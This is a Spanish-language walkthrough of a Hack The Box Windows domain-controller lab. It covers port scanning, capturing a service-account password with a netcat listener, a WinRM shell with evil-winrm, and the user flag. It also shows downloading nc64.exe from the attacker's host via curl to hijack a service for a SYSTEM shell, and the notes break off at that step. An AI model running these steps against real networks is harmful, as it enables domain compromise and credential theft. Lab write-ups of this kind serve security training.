- ### Enumeración
	- **Escaneo de puertos:**
		```bash
		nmap -Pn -n -vvv -sS -p-  10.10.11.108 -sC -sV -oG "puertos" -T5
		Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-01 19:13 EDT
		NSE: Loaded 156 scripts for scanning.
		NSE: Script Pre-scanning.
		NSE: Starting runlevel 1 (of 3) scan.
		Initiating NSE at 19:13
		Completed NSE at 19:13, 0.00s elapsed
		NSE: Starting runlevel 2 (of 3) scan.
		Initiating NSE at 19:13
		Completed NSE at 19:13, 0.00s elapsed
		NSE: Starting runlevel 3 (of 3) scan.
		Initiating NSE at 19:13
		Completed NSE at 19:13, 0.00s elapsed
		Initiating SYN Stealth Scan at 19:13
		Scanning 10.10.11.108 [65535 ports]
		Discovered open port 53/tcp on 10.10.11.108
		Discovered open port 80/tcp on 10.10.11.108
		Discovered open port 445/tcp on 10.10.11.108
		Discovered open port 135/tcp on 10.10.11.108
		Discovered open port 139/tcp on 10.10.11.108
		Discovered open port 88/tcp on 10.10.11.108
		Increasing send delay for 10.10.11.108 from 0 to 5 due to 1416 out of 3539 dropped probes since last increase.
		SYN Stealth Scan Timing: About 7.65% done; ETC: 19:20 (0:06:14 remaining)
		Warning: 10.10.11.108 giving up on port because retransmission cap hit (2).
		Discovered open port 49666/tcp on 10.10.11.108
		Stats: 0:00:55 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
		SYN Stealth Scan Timing: About 10.37% done; ETC: 19:22 (0:08:04 remaining)
		Discovered open port 51673/tcp on 10.10.11.108
		Discovered open port 49671/tcp on 10.10.11.108
		Discovered open port 9389/tcp on 10.10.11.108
		SYN Stealth Scan Timing: About 16.85% done; ETC: 19:22 (0:07:04 remaining)
		Discovered open port 49667/tcp on 10.10.11.108
		SYN Stealth Scan Timing: About 23.08% done; ETC: 19:22 (0:06:37 remaining)
		SYN Stealth Scan Timing: About 28.91% done; ETC: 19:22 (0:06:06 remaining)
		Discovered open port 636/tcp on 10.10.11.108
		SYN Stealth Scan Timing: About 34.82% done; ETC: 19:22 (0:05:35 remaining)
		Discovered open port 49664/tcp on 10.10.11.108
		Discovered open port 47001/tcp on 10.10.11.108
		Discovered open port 3268/tcp on 10.10.11.108
		SYN Stealth Scan Timing: About 42.69% done; ETC: 19:22 (0:05:09 remaining)
		Discovered open port 49675/tcp on 10.10.11.108
		Discovered open port 49682/tcp on 10.10.11.108
		SYN Stealth Scan Timing: About 48.51% done; ETC: 19:22 (0:04:36 remaining)
		SYN Stealth Scan Timing: About 54.15% done; ETC: 19:22 (0:04:08 remaining)
		Discovered open port 49674/tcp on 10.10.11.108
		SYN Stealth Scan Timing: About 60.81% done; ETC: 19:22 (0:03:40 remaining)
		Discovered open port 464/tcp on 10.10.11.108
		Discovered open port 3269/tcp on 10.10.11.108
		Discovered open port 593/tcp on 10.10.11.108
		SYN Stealth Scan Timing: About 67.85% done; ETC: 19:23 (0:03:09 remaining)
		Discovered open port 49665/tcp on 10.10.11.108
		Discovered open port 389/tcp on 10.10.11.108
		SYN Stealth Scan Timing: About 73.24% done; ETC: 19:23 (0:02:36 remaining)
		SYN Stealth Scan Timing: About 78.98% done; ETC: 19:23 (0:02:04 remaining)
		Discovered open port 49679/tcp on 10.10.11.108
		SYN Stealth Scan Timing: About 84.38% done; ETC: 19:23 (0:01:33 remaining)
		Discovered open port 49694/tcp on 10.10.11.108
		Discovered open port 5985/tcp on 10.10.11.108
		SYN Stealth Scan Timing: About 89.59% done; ETC: 19:23 (0:01:02 remaining)
		SYN Stealth Scan Timing: About 94.80% done; ETC: 19:23 (0:00:31 remaining)
		Completed SYN Stealth Scan at 19:23, 608.47s elapsed (65535 total ports)
		Initiating Service scan at 19:23
		Scanning 26 services on 10.10.11.108
		Service scan Timing: About 65.38% done; ETC: 19:25 (0:00:31 remaining)
		Completed Service scan at 19:24, 57.73s elapsed (26 services on 1 host)
		NSE: Script scanning 10.10.11.108.
		NSE: Starting runlevel 1 (of 3) scan.
		Initiating NSE at 19:24
		Completed NSE at 19:24, 10.79s elapsed
		NSE: Starting runlevel 2 (of 3) scan.
		Initiating NSE at 19:24
		Completed NSE at 19:24, 6.90s elapsed
		NSE: Starting runlevel 3 (of 3) scan.
		Initiating NSE at 19:24
		Completed NSE at 19:24, 0.01s elapsed
		Nmap scan report for 10.10.11.108
		Host is up, received user-set (0.24s latency).
		Scanned at 2025-04-01 19:13:30 EDT for 684s
		Not shown: 65245 closed tcp ports (reset), 264 filtered tcp ports (no-response)
		PORT      STATE SERVICE       REASON          VERSION
		53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
		80/tcp    open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
		|_http-title: HTB Printer Admin Panel
		|_http-server-header: Microsoft-IIS/10.0
		| http-methods: 
		|   Supported Methods: OPTIONS TRACE GET HEAD POST
		|_  Potentially risky methods: TRACE
		88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-04-01 23:42:23Z)
		135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
		139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
		389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
		445/tcp   open  microsoft-ds? syn-ack ttl 127
		464/tcp   open  kpasswd5?     syn-ack ttl 127
		593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
		636/tcp   open  tcpwrapped    syn-ack ttl 127
		3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
		3269/tcp  open  tcpwrapped    syn-ack ttl 127
		5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
		|_http-server-header: Microsoft-HTTPAPI/2.0
		|_http-title: Not Found
		9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
		47001/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
		|_http-title: Not Found
		|_http-server-header: Microsoft-HTTPAPI/2.0
		49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
		49665/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
		49666/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
		49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
		49671/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
		49674/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
		49675/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
		49679/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
		49682/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
		49694/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
		51673/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
		Service Info: Host: PRINTER; OS: Windows; CPE: cpe:/o:microsoft:windows
		
		Host script results:
		| smb2-time: 
		|   date: 2025-04-01T23:43:19
		|_  start_date: N/A
		|_clock-skew: 18m36s
		| p2p-conficker: 
		|   Checking for Conficker.C or higher...
		|   Check 1 (port 31931/tcp): CLEAN (Couldn't connect)
		|   Check 2 (port 22702/tcp): CLEAN (Couldn't connect)
		|   Check 3 (port 26260/udp): CLEAN (Failed to receive data)
		|   Check 4 (port 44869/udp): CLEAN (Timeout)
		|_  0/4 checks are positive: Host is CLEAN or ports are blocked
		| smb2-security-mode: 
		|   3:1:1: 
		|_    Message signing enabled and required
		
		NSE: Script Post-scanning.
		NSE: Starting runlevel 1 (of 3) scan.
		Initiating NSE at 19:24
		Completed NSE at 19:24, 0.00s elapsed
		NSE: Starting runlevel 2 (of 3) scan.
		Initiating NSE at 19:24
		Completed NSE at 19:24, 0.00s elapsed
		NSE: Starting runlevel 3 (of 3) scan.
		Initiating NSE at 19:24
		Completed NSE at 19:24, 0.00s elapsed
		Read data files from: /usr/share/nmap
		Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
		Nmap done: 1 IP address (1 host up) scanned in 684.36 seconds
		           Raw packets sent: 70082 (3.084MB) | Rcvd: 66208 (2.691MB)

		```
	- **Obtencion de informacion a partir de herremientas:**
		```bash
		crackmapexec smb 10.10.11.108
		[*] First time use detected
		[*] Creating home directory structure
		[*] Creating default workspace
		[*] Initializing SSH protocol database
		[*] Initializing MSSQL protocol database
		[*] Initializing SMB protocol database
		[*] Initializing WINRM protocol database
		[*] Initializing LDAP protocol database
		[*] Initializing FTP protocol database
		[*] Initializing RDP protocol database
		[*] Copying default configuration file
		[*] Generating SSL certificate
		SMB         10.10.11.108    445    PRINTER          [*] Windows 10 / Server 2019 Build 17763 x64 (name:PRINTER) (domain:return.local) (signing:True) (SMBv1:False)

		```
	- **Obtencion de contraseña por medio de netcat:**
		
		```
		nc -nlvp 389
		listening on [any] 389 ...
		connect to [10.10.14.3] from (UNKNOWN) [10.10.11.108] 49439
		0*`%return\svc-printer�
        1edFg43012!!^C
		```
	- ![[Pasted image 20250401205243.png]]
	- **Obtencion de informacion a partir de la contraseña obtenida anteriormente:**
		```bash
		crackmapexec smb 10.10.11.108 -u 'svc-printer' -p '1edFg43012!!'        
		SMB         10.10.11.108    445    PRINTER          [*] Windows 10 / Server 2019 Build 17763 x64 (name:PRINTER) (domain:return.local) (signing:True) (SMBv1:False)
		SMB         10.10.11.108    445    PRINTER          [+] return.local\svc-printer:1edFg43012!! 
		```

```bash
crackmapexec winrm  10.10.11.108 -u 'svc-printer' -p '1edFg43012!!'
SMB         10.10.11.108    5985   PRINTER          [*] Windows 10 / Server 2019 Build 17763 (name:PRINTER) (domain:return.local)
HTTP        10.10.11.108    5985   PRINTER          [*] http://10.10.11.108:5985/wsman
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.10.11.108    5985   PRINTER          [+] return.local\svc-printer:1edFg43012!! (Pwn3d!)
```

- ### Éxplotacion:
	- **Evil-winrm:**
		```bash
		evil-winrm -i 10.10.11.108 -p '1edFg43012!!' -u 'svc-printer'
                                        
		Evil-WinRM shell v3.7
		                                        
		Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
		                                        
		Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
		                                        
		Info: Establishing connection to remote endpoint
		*Evil-WinRM* PS C:\Users\svc-printer\Documents> 
		```
		- **Obtencion de flag user.txt:**
			```bash
			*Evil-WinRM* PS C:\Users\svc-printer\Desktop> type user.txt
			446ef411386ccafe01f7d71cc83a89e5
			*Evil-WinRM* PS C:\Users\svc-printer\Desktop> pwd
			
			Path
			----
			C:\Users\svc-printer\Desktop
			
			
			*Evil-WinRM* PS C:\Users\svc-printer\Desktop> 
			
			```
- ### Éscalacion de privilegios:
	- **Enumeracion para escalacion de privilegios:**
		```bash
		*Evil-WinRM* PS C:\Users\svc-printer\Desktop> net user svc-printer
		User name                    svc-printer
		Full Name                    SVCPrinter
		Comment                      Service Account for Printer
		Users comment
		Country/region code          000 (System Default)
		Account active               Yes
		Account expires              Never
		
		Password last set            5/26/2021 1:15:13 AM
		Password expires             Never
		Password changeable          5/27/2021 1:15:13 AM
		Password required            Yes
		User may change password     Yes
		
		Workstations allowed         All
		Logon script
		User profile
		Home directory
		Last logon                   5/26/2021 1:39:29 AM
		
		Logon hours allowed          All
		
		Local Group Memberships      *Print Operators      *Remote Management Use
									 *Server Operators
		Global Group memberships     *Domain Users
		The command completed successfully.
		```
	- **Elevacion con netcat:**
		- Se descarga netcat en la maquina atacante para luego descomprimir el .zip y montar con python un servidor http para luego poder descargarlo desde la maquina victima
			```bash
			──(kali㉿kali)-[~/Downloads]
			└─$ ls
			cacert.der  netcat-win32-1.11.zip
			┌──(kali㉿kali)-[~/Downloads]
			└─$ unzip netcat-win32-1.11.zip 
			Archive:  netcat-win32-1.11.zip
			  inflating: netcat-1.11/doexec.c    
			  inflating: netcat-1.11/generic.h   
			  inflating: netcat-1.11/getopt.c    
			  inflating: netcat-1.11/getopt.h    
			  inflating: netcat-1.11/hobbit.txt  
			  inflating: netcat-1.11/license.txt  
			  inflating: netcat-1.11/Makefile    
			  inflating: netcat-1.11/nc.exe      
			  inflating: netcat-1.11/nc64.exe    
			  inflating: netcat-1.11/netcat.c    
			  inflating: netcat-1.11/readme.txt  
			┌──(kali㉿kali)-[~/Downloads]
			└─$ python3 http.server 80
			python3: cant open file '/home/kali/Downloads/http.server': [Errno 2] No such file or directory
			┌──(kali㉿kali)-[~/Downloads]
			└─$ python3 -m http.server 80
			Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
			^C
			Keyboard interrupt received, exiting.
			┌──(kali㉿kali)-[~/Downloads]
			└─$ cd netcat-1.11         
			┌──(kali㉿kali)-[~/Downloads/netcat-1.11]
			└─$ python3 -m http.server 80
			Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
			10.10.11.108 - - [03/Apr/2025 20:33:22] code 404, message File not found
			10.10.11.108 - - [03/Apr/2025 20:33:22] "GET /ne64.exe HTTP/1.1" 404 -
			10.10.11.108 - - [03/Apr/2025 20:33:35] "GET /nc64.exe HTTP/1.1" 200 -
			```
	
			```bash
			- *Evil-WinRM* PS C:\Users\svc-printer\Desktop> curl 10.10.14.3/nc64.exe -o nc.exe
			*Evil-WinRM* PS C:\Users\svc-printer\Desktop> dir
			
			
			    Directory: C:\Users\svc-printer\Desktop
			
			
			Mode                LastWriteTime         Length Name
			----                -------------         ------ ----
			-a----         4/3/2025   5:52 PM          43696 nc.exe
			-ar---         4/3/2025   5:30 PM             34 user.txt
			```
		- Suplantacion de un servicio por nc.exe para poder obtener una reverse shell como root:
			- Consulto sobre todos los servicios que tiene ejecutando el equipo:
				```bash
				*Evil-WinRM* PS C:\Users\svc-printer\Desktop> services
				
				Path                                                                                                                 Privileges Service          
				----                                                                                                                 ---------- -------          
				C:\Windows\ADWS\Microsoft.ActiveDirectory.WebServices.exe                                                                  True ADWS             
				\??\C:\ProgramData\Microsoft\Windows Defender\Definition Updates\{5533AFC7-64B3-4F6E-B453-E35320B35716}\MpKslDrv.sys       True MpKslceeb2796    
				C:\Windows\Microsoft.NET\Framework64\v4.0.30319\SMSvcHost.exe                                                              True NetTcpPortSharing
				C:\Windows\SysWow64\perfhost.exe                                                                                           True PerfHost         
				"C:\Program Files\Windows Defender Advanced Threat Protection\MsSense.exe"                                                False Sense            
				C:\Windows\servicing\TrustedInstaller.exe                                                                                 False TrustedInstaller 
				"C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe"                                                     True VGAuthService    
				"C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"                                                                        True VMTools          
				"C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2104.14-0\NisSrv.exe"                                             True WdNisSvc         
				"C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2104.14-0\MsMpEng.exe"                                            True WinDefend        
				"C:\Program Files\Windows Media Player\wmpnetwk.exe"                                                                      False WMPNetworkSvc    
				
				```
		- configuro  con sc.exe para cambiar el servicio VMwareTools
		![[Pasted image 20250403215754.png]]
		- 